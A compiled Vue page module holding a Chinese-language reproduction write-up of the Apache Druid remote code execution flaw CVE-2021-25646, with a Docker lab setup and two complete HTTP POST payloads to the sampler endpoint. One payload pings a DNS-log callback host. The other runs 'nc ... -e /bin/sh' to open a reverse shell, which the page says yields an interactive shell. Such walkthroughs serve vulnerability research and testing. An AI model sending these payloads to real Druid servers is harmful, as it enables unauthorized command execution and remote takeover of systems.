import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as i,c as r,a as t,b as o,d as n,e as u}from"./app-58e4a7d6.js";const l={},q=t("h2",{id:"漏洞描述",tabindex:"-1"},[t("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),o(" 漏洞描述")],-1),c=t("p",null,"Apache Druid 是用Java编写的面向列的开源分布式数据存储，旨在快速获取大量事件数据，并在数据之上提供低延迟查询。 Apache Druid 默认情况下缺乏授权认证，攻击者可以发送特制请求，利用Druid服务器上进程的特权执行任意代码。 Apache Druid包括执行用户提供的JavaScript的功能嵌入在各种类型请求中的代码。此功能在用于高信任度环境中，默认已被禁用。但是，在Druid 0.20.0及更低版本中，经过身份验证的用户发送恶意请求，利用Apache Druid漏洞可以执行任意代码。",-1),p=t("p",null,"参考链接：",-1),d={href:"https://github.com/apache/druid/issues/2434",target:"_blank",rel:"noopener noreferrer"},m={href:"https://forum.ywhack.com/thread-115083-1-1.html",target:"_blank",rel:"noopener noreferrer"},h={href:"https://druid.apache.org/docs/latest/operations/api-reference.html#broker",target:"_blank",rel:"noopener noreferrer"},x={href:"https://lists.apache.org/thread.html/r20e0c3b10ae2c05a3aad40f1476713c45bdefc32c920b9986b941d8f@%3Cannounce.apache.org%3E",target:"_blank",rel:"noopener noreferrer"},g={href:"https://www.o2oxy.cn/3090.html",target:"_blank",rel:"noopener noreferrer"},b=u(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache Druid &lt; 0.20.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>这里使用Docker来搭建环境</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/524514a5-199b-4365-a193-1defa9017858.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,5),f={href:"https://github.com/apache/druid/archive/druid-0.20.0.zip",target:"_blank",rel:"noopener noreferrer"},_=t("p",null,[o("下载之后进入目录 "),t("strong",null,"distribution\\docker")],-1),v=t("p",null,[o("执行命令编译 "),t("strong",null,"docker-compose up -d")],-1),k=t("figure",null,[t("img",{src:"https://cb86160.webp.li/makabaka-r1-photo/202202090029557.png",alt:"",tabindex:"0",loading:"lazy"}),t("figcaption")],-1),y={href:"http://xxx.xxx.xxx.xxx:8888",target:"_blank",rel:"noopener noreferrer"},C=t("figure",null,[t("img",{src:"https://cb86160.webp.li/makabaka-r1-photo/202202090029993.png",alt:"",tabindex:"0",loading:"lazy"}),t("figcaption")],-1),w=t("h2",{id:"漏洞复现",tabindex:"-1"},[t("a",{class:"header-anchor",href:"#漏洞复现","aria-hidden":"true"},"#"),o(" 漏洞复现")],-1),S={href:"https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw",target:"_blank",rel:"noopener noreferrer"},j=u(`<p>POC请求包</p><div class="language-json line-numbers-mode" data-ext="json"><pre class="language-json"><code>POST /druid/indexer/v1/sampler HTTP/<span class="token number">1.1</span>
Host<span class="token operator">:</span> xxx.xxx.xxx.xxx<span class="token operator">:</span><span class="token number">8888</span>
User-Agent<span class="token operator">:</span> Mozilla/<span class="token number">5.0</span> (Macintosh; Intel Mac OS X <span class="token number">10.16</span>; rv<span class="token operator">:</span><span class="token number">85.0</span>) Gecko/<span class="token number">20100101</span> Firefox/<span class="token number">85.0</span>
Accept<span class="token operator">:</span> application/json<span class="token punctuation">,</span> text/plain<span class="token punctuation">,</span> *<span class="token comment">/*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/json
Content-Length: 995
Connection: close


{&quot;type&quot;: &quot;index&quot;, &quot;spec&quot;: {&quot;ioConfig&quot;: {&quot;type&quot;: &quot;index&quot;, &quot;inputSource&quot;: {&quot;type&quot;: &quot;inline&quot;, &quot;data&quot;: &quot;{\\&quot;isRobot\\&quot;:true,\\&quot;channel\\&quot;:\\&quot;#x\\&quot;,\\&quot;timestamp\\&quot;:\\&quot;2021-2-1T14:12:24.050Z\\&quot;,\\&quot;flags\\&quot;:\\&quot;x\\&quot;,\\&quot;isUnpatrolled\\&quot;:false,\\&quot;page\\&quot;:\\&quot;1\\&quot;,\\&quot;diffUrl\\&quot;:\\&quot;https://xxx.com\\&quot;,\\&quot;added\\&quot;:1,\\&quot;comment\\&quot;:\\&quot;Botskapande Indonesien omdirigering\\&quot;,\\&quot;commentLength\\&quot;:35,\\&quot;isNew\\&quot;:true,\\&quot;isMinor\\&quot;:false,\\&quot;delta\\&quot;:31,\\&quot;isAnonymous\\&quot;:true,\\&quot;user\\&quot;:\\&quot;Lsjbot\\&quot;,\\&quot;deltaBucket\\&quot;:0,\\&quot;deleted\\&quot;:0,\\&quot;namespace\\&quot;:\\&quot;Main\\&quot;}&quot;}, &quot;inputFormat&quot;: {&quot;type&quot;: &quot;json&quot;, &quot;keepNullColumns&quot;: true}}, &quot;dataSchema&quot;: {&quot;dataSource&quot;: &quot;sample&quot;, &quot;timestampSpec&quot;: {&quot;column&quot;: &quot;timestamp&quot;, &quot;format&quot;: &quot;iso&quot;}, &quot;dimensionsSpec&quot;: {}, &quot;transformSpec&quot;: {&quot;transforms&quot;: [], &quot;filter&quot;: {&quot;type&quot;: &quot;javascript&quot;, &quot;dimension&quot;: &quot;added&quot;, &quot;function&quot;: &quot;function(value) {java.lang.Runtime.getRuntime().exec(&#39;ping xxxxx.dnslog.cn&#39;)}&quot;, &quot;&quot;: {&quot;enabled&quot;: true}}}}, &quot;type&quot;: &quot;index&quot;, &quot;tuningConfig&quot;: {&quot;type&quot;: &quot;index&quot;}}, &quot;samplerConfig&quot;: {&quot;numRows&quot;: 500, &quot;timeoutMs&quot;: 15000}}
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/4.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,3),A=t("li",null,"注意请求中这个位置改为你的dnslog平台地址",-1),z={href:"http://xxxxx.dnslog.cn",target:"_blank",rel:"noopener noreferrer"},T=u(`<p>发送请求即可命令执行</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/5.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><ul><li>可能大部分都是docker搭建，而里面大部分命令是不存在的，但是发现docker里面居然默认是有 NC 命令的，那我们就可以用nc反弹一个shell了</li></ul><p>反弹shell请求包</p><div class="language-json line-numbers-mode" data-ext="json"><pre class="language-json"><code>POST /druid/indexer/v1/sampler HTTP/<span class="token number">1.1</span>
Host<span class="token operator">:</span> xxx.xxx.xxx.xxx<span class="token operator">:</span><span class="token number">8888</span>
User-Agent<span class="token operator">:</span> Mozilla/<span class="token number">5.0</span> (Macintosh; Intel Mac OS X <span class="token number">10.16</span>; rv<span class="token operator">:</span><span class="token number">85.0</span>) Gecko/<span class="token number">20100101</span> Firefox/<span class="token number">85.0</span>
Accept<span class="token operator">:</span> application/json<span class="token punctuation">,</span> text/plain<span class="token punctuation">,</span> *<span class="token comment">/*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/json
Content-Length: 1008
Connection: close


{&quot;type&quot;: &quot;index&quot;, &quot;spec&quot;: {&quot;ioConfig&quot;: {&quot;type&quot;: &quot;index&quot;, &quot;inputSource&quot;: {&quot;type&quot;: &quot;inline&quot;, &quot;data&quot;: &quot;{\\&quot;isRobot\\&quot;:true,\\&quot;channel\\&quot;:\\&quot;#x\\&quot;,\\&quot;timestamp\\&quot;:\\&quot;2021-2-1T14:12:24.050Z\\&quot;,\\&quot;flags\\&quot;:\\&quot;x\\&quot;,\\&quot;isUnpatrolled\\&quot;:false,\\&quot;page\\&quot;:\\&quot;1\\&quot;,\\&quot;diffUrl\\&quot;:\\&quot;https://xxx.com\\&quot;,\\&quot;added\\&quot;:1,\\&quot;comment\\&quot;:\\&quot;Botskapande Indonesien omdirigering\\&quot;,\\&quot;commentLength\\&quot;:35,\\&quot;isNew\\&quot;:true,\\&quot;isMinor\\&quot;:false,\\&quot;delta\\&quot;:31,\\&quot;isAnonymous\\&quot;:true,\\&quot;user\\&quot;:\\&quot;Lsjbot\\&quot;,\\&quot;deltaBucket\\&quot;:0,\\&quot;deleted\\&quot;:0,\\&quot;namespace\\&quot;:\\&quot;Main\\&quot;}&quot;}, &quot;inputFormat&quot;: {&quot;type&quot;: &quot;json&quot;, &quot;keepNullColumns&quot;: true}}, &quot;dataSchema&quot;: {&quot;dataSource&quot;: &quot;sample&quot;, &quot;timestampSpec&quot;: {&quot;column&quot;: &quot;timestamp&quot;, &quot;format&quot;: &quot;iso&quot;}, &quot;dimensionsSpec&quot;: {}, &quot;transformSpec&quot;: {&quot;transforms&quot;: [], &quot;filter&quot;: {&quot;type&quot;: &quot;javascript&quot;, &quot;dimension&quot;: &quot;added&quot;, &quot;function&quot;: &quot;function(value) {java.lang.Runtime.getRuntime().exec(&#39; nc xxx.xxx.xxx.xxx 9999 -e /bin/sh&#39;)}&quot;, &quot;&quot;: {&quot;enabled&quot;: true}}}}, &quot;type&quot;: &quot;index&quot;, &quot;tuningConfig&quot;: {&quot;type&quot;: &quot;index&quot;}}, &quot;samplerConfig&quot;: {&quot;numRows&quot;: 500, &quot;timeoutMs&quot;: 15000}}
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>发送请求包就可以得到一个交互式shell</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/6.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,7);function M(L,R){const e=s("ExternalLinkIcon");return i(),r("div",null,[q,c,p,t("ul",null,[t("li",null,[t("a",d,[o("https://github.com/apache/druid/issues/2434"),n(e)])]),t("li",null,[t("a",m,[o("https://forum.ywhack.com/thread-115083-1-1.html"),n(e)])]),t("li",null,[t("a",h,[o("https://druid.apache.org/docs/latest/operations/api-reference.html#broker"),n(e)])]),t("li",null,[t("a",x,[o("https://lists.apache.org/thread.html/r20e0c3b10ae2c05a3aad40f1476713c45bdefc32c920b9986b941d8f@<announce.apache.org>"),n(e)])]),t("li",null,[t("a",g,[o("https://www.o2oxy.cn/3090.html"),n(e)])])]),b,t("p",null,[o("Docker下载链接: "),t("a",f,[o("https://github.com/apache/druid/archive/druid-0.20.0.zip"),n(e)])]),_,v,k,t("p",null,[o("访问 "),t("a",y,[o("http://xxx.xxx.xxx.xxx:8888"),n(e)]),o(" 正常就行了")]),C,w,t("p",null,[o("漏洞原理: "),t("a",S,[o("https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw"),n(e)])]),j,t("ul",null,[A,t("li",null,[o("java.lang.Runtime.getRuntime().exec('ping -c 4 "),t("a",z,[o("xxxxx.dnslog.cn"),n(e)]),o("')")])]),T])}const I=a(l,[["render",M],["__file","Apache Druid 远程代码执行漏洞 CVE-2021-25646.html.vue"]]);export{I as default};
